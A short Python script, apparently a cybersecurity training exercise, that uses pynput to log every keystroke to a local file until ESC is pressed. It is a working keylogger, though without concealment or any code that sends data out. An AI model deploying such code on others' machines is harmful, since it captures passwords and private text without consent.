# PRODIGY_CS_04
from pynput.keyboard import Key, Listener

# File to store the keystrokes
LOG_FILE = "keylog.txt"

def on_press(key):
    try:
        with open(LOG_FILE, "a") as file:
            # Write the key pressed to the log file
            file.write(f"{key.char}")
    except AttributeError:
        # Handle special keys like Space, Enter, etc.
        with open(LOG_FILE, "a") as file:
            file.write(f" [{key}] ")

def on_release(key):
    # Stop the listener on pressing ESC
    if key == Key.esc:
        return False

# Setting up the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()